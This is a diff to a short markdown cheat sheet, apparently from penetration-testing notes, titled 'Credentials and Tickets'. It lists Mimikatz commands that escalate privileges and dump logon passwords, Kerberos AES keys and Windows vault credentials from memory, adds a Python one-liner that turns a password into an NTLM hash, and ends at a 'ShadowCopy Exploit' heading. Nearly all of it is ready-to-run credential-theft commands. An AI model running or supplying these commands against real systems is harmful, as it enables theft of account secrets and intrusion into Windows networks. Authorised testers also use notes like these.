@@ -1,13 +1,23 @@
 # Credentials and Tickets
 
-### Enumerate Users And Hashes
+## Enumerate Users And Hashes
 
 ```
 privilege::debug
 token::elevate
 
 sekurlsa::logonpasswords 
-sekurlsa::ekeys
+sekurlsa::ekeys /aes128
+sekurlsa::ekeys /aes256
+
+vault::cred
+vault::list
+```
+
+## NTLM From Password
+
+```
+python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
 ```
 
 ## ShadowCopy Exploit
